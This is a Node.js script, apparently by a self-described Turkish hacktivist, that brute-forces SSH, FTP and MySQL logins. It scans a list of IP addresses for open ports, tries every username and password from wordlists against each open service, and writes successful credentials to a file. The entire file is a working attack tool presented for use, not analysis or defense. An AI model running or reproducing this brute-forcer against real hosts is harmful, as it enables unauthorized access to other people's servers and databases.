const fs = require('fs');
const net = require('net');
const { Client } = require('ssh2');
const ftp = require('ftp');
const mysql = require('mysql');
const chalk = require('chalk');
const ora = require('ora');

const success = chalk.green.bold;
const error = chalk.red.bold;
const info = chalk.blue.bold;
const warning = chalk.yellow.bold;

console.log(chalk.cyan.bold(`
  ____             _                 _       _   _  ____   _   _  _  __
 |  _ \\  ___ _   _| | ___  _ __ ___ (_)_ __ | |_| |/ ___| | \\ | || |/ /
 | | | |/ _ \\ | | | |/ _ \\| '_ \` _ \\| | '_ \\| __| | |  _  |  \\| || ' / 
 | |_| |  __/ |_| | | (_) | | | | | | | | | | |_| | |_| | | |\\  || . \\ 
 |____/ \\___|\\__,_|_|\\___/|_| |_| |_|_|_| |_|\\__|_|\\____| |_| \\_||_|\\_\\
 
    Coder By: Turkish Hacktivist RootAyyildiz
`));

const ipDosyasi = 'ip.txt';
const kullaniciDosyasi = 'user.txt';
const sifreDosyasi = 'pass.txt';

const ipAdresleri = fs.readFileSync(ipDosyasi, 'utf-8').split('\n').map(line => line.trim());
const kullaniciAdlari = fs.readFileSync(kullaniciDosyasi, 'utf-8').split('\n').map(line => line.trim());
const sifreler = fs.readFileSync(sifreDosyasi, 'utf-8').split('\n').map(line => line.trim());

function sshBaglan(ip, kullanici, sifre) {
    return new Promise((resolve, reject) => {
        const conn = new Client();
        conn.on('ready', () => {
            console.log(success(`✅ Başarılı SSH girişi: ${ip}, Kullanıcı: ${kullanici}, Şifre: ${sifre}`));
            fs.appendFileSync('basarili_girisler.txt', `Başarılı SSH girişi: ${ip}, Kullanıcı: ${kullanici}, Şifre: ${sifre}\n`);
            conn.end();
            resolve(true);
        }).on('error', (err) => {
            reject(false);
        }).connect({
            host: ip,
            port: 22,
            username: kullanici,
            password: sifre
        });
    });
}

function ftpBaglan(ip, kullanici, sifre) {
    return new Promise((resolve, reject) => {
        const client = new ftp();
        client.on('ready', () => {
            console.log(success(`✅ Başarılı FTP girişi: ${ip}, Kullanıcı: ${kullanici}, Şifre: ${sifre}`));
            fs.appendFileSync('basarili_girisler.txt', `Başarılı FTP girişi: ${ip}, Kullanıcı: ${kullanici}, Şifre: ${sifre}\n`);
            client.end();
            resolve(true);
        }).on('error', (err) => {
            reject(false);
        });
        client.connect({
            host: ip,
            user: kullanici,
            password: sifre
        });
    });
}

function mysqlBaglan(ip, kullanici, sifre) {
    return new Promise((resolve, reject) => {
        const conn = mysql.createConnection({
            host: ip,
            user: kullanici,
            password: sifre
        });

        conn.connect((err) => {
            if (err) {
                reject(false);
            } else {
                console.log(success(`✅ Başarılı MySQL girişi: ${ip}, Kullanıcı: ${kullanici}, Şifre: ${sifre}`));
                fs.appendFileSync('basarili_girisler.txt', `Başarılı MySQL girişi: ${ip}, Kullanıcı: ${kullanici}, Şifre: ${sifre}\n`);
                conn.end();
                resolve(true);
            }
        });
    });
}

function portAcikMi(ip, port) {
    return new Promise((resolve) => {
        const socket = new net.Socket();
        socket.setTimeout(1000);
        socket.on('connect', () => {
            socket.destroy();
            resolve(true);
        }).on('error', () => {
            resolve(false);
        }).on('timeout', () => {
            socket.destroy();
            resolve(false);
        }).connect(port, ip);
    });
}

async function bruteForce() {
    for (const ip of ipAdresleri) {
        const spinner = ora(info(`🔍 IP adresi denetleniyor: ${ip}`)).start();

        if (await portAcikMi(ip, 22)) {
            spinner.succeed(info(`${ip} adresinde SSH servisi açık.`));
            for (const kullanici of kullaniciAdlari) {
                for (const sifre of sifreler) {
                    console.log(warning(`🔑 SSH denemesi - IP: ${ip}, Kullanıcı: ${kullanici}, Şifre: ${sifre}`));
                    try {
                        if (await sshBaglan(ip, kullanici, sifre)) break;
                    } catch {}
                }
            }
        } else {
            spinner.fail(error(`❌ ${ip} adresinde SSH servisi kapalı.`));
        }

        if (await portAcikMi(ip, 21)) {
            spinner.succeed(info(`${ip} adresinde FTP servisi açık.`));
            for (const kullanici of kullaniciAdlari) {
                for (const sifre of sifreler) {
                    console.log(warning(`🔑 FTP denemesi - IP: ${ip}, Kullanıcı: ${kullanici}, Şifre: ${sifre}`));
                    try {
                        if (await ftpBaglan(ip, kullanici, sifre)) break;
                    } catch {}
                }
            }
        } else {
            spinner.fail(error(`❌ ${ip} adresinde FTP servisi kapalı.`));
        }

        if (await portAcikMi(ip, 3306)) {
            spinner.succeed(info(`${ip} adresinde MySQL servisi açık.`));
            for (const kullanici of kullaniciAdlari) {
                for (const sifre of sifreler) {
                    console.log(warning(`🔑 MySQL denemesi - IP: ${ip}, Kullanıcı: ${kullanici}, Şifre: ${sifre}`));
                    try {
                        if (await mysqlBaglan(ip, kullanici, sifre)) break;
                    } catch {}
                }
            }
        } else {
            spinner.fail(error(`❌ ${ip} adresinde MySQL servisi kapalı.`));
        }
    }
    console.log(success("🎉 İşlem tamamlandı. Başarılı girişler 'basarili_girisler.txt' dosyasına kaydedildi."));
}

bruteForce();
